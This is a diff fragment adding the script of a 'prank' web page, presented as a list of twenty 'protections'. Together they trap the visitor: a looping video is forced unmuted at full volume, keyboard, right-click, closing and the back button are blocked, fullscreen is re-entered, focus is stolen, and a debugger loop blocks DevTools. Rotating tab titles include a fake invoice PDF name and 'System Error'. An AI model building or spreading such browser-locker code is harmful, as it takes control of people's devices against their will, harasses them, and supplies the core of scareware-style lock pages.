+        //         ALL PROTECTIONS 🛡️
+        // ══════════════════════════════════════
+
+        function startProtections() {
+
+            // 1. Loop forever
+            prankVideo.addEventListener('ended', () => {
+                prankVideo.currentTime = 0;
+                prankVideo.play();
+            });
+
+            // 2. Can't pause
+            prankVideo.addEventListener('pause', () => {
+                setTimeout(() => { prankVideo.play().catch(() => {}); }, 10);
+            });
+
+            // 3. Keep checking
+            setInterval(() => {
+                if (prankVideo.paused) prankVideo.play().catch(() => {});
+                prankVideo.volume = 1.0;
+                prankVideo.muted = false;
+            }, 300);
+
+            // 4. Block keyboard
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                prankVideo.muted = false;
+                prankVideo.volume = 1.0;
+                prankVideo.play().catch(() => {});
+                return false;
+            }, true);
+
+            // 5. Block right click
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                return false;
+            });
+
+            // 6. Any click/touch → play + unmute
+            ['click', 'touchstart', 'touchend', 'mousedown'].forEach(evt => {
+                document.addEventListener(evt, () => {
+                    prankVideo.muted = false;
+                    prankVideo.volume = 1.0;
+                    prankVideo.play().catch(() => {});
+                });
+            });
+
+            // 7. Block close
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+
+            // 8. Re-fullscreen
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    setTimeout(tryFullscreen, 200);
+                }
+            });
+
+            // 9. Rotating titles
+            const titles = [
+                '📄 Invoice_Receipt_2024.pdf',
+                '⚠️ System Error',
+                '😂 PRANKED!!!',
+                '💀 No escape',
+                '🤡 HAHAHA',
+                '😈 Enjoy!',
+                '🔊 VOLUME: 100%',
+                '🤣 Good luck closing this!',
+            ];
+            let ti = 0;
+            setInterval(() => {
+                document.title = titles[ti % titles.length];
+                ti++;
+            }, 1500);
+
+            // 10. Disable selection & drag
+            document.onselectstart = () => false;
+            document.ondragstart = () => false;
+
+            // 11. Block DevTools
+            setInterval(() => { debugger; }, 1000);
+
+            // 12. No pointer events on video
+            prankVideo.style.pointerEvents = 'none';
+
+            // 13. Focus stealer
+            window.addEventListener('blur', () => {
+                setTimeout(() => { window.focus(); }, 100);
+            });
+
+            // 14. Visibility change
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden) {
+                    prankVideo.play().catch(() => {});
+                    prankVideo.volume = 1.0;
+                    prankVideo.muted = false;
+                }
+            });
+
+            // 15. Block pinch zoom (mobile)
+            document.addEventListener('touchmove', (e) => {
+                if (e.touches.length > 1) e.preventDefault();
+            }, { passive: false });
+
+            // 16. Block double tap zoom
+            let lastTap = 0;
+            document.addEventListener('touchend', (e) => {
+                const now = Date.now();
+                if (now - lastTap < 300) e.preventDefault();
+                lastTap = now;
+            }, { passive: false });
+
+            // 17. Block back button (mobile)
+            window.history.pushState(null, '', window.location.href);
+            window.addEventListener('popstate', () => {
+                window.history.pushState(null, '', window.location.href);
+                prankVideo.play().catch(() => {});
+            });
+
+            // 18. Disable volume buttons override (keep trying)
+            setInterval(() => {
+                prankVideo.volume = 1.0;
+                prankVideo.muted = false;
+            }, 100);
+
+            // 19. Wake lock (keep screen on - mobile)
+            if ('wakeLock' in navigator) {
+                try {
+                    navigator.wakeLock.request('screen');
+                } catch (e) {}
+            }
+
+            // 20. Orientation lock (mobile)
+            if (screen.orientation && screen.orientation.lock) {
+                try {
+                    screen.orientation.lock('landscape').catch(() => {});
+                } catch (e) {}
+            }
+        }
+    </script>
+
+</body>
+</html>
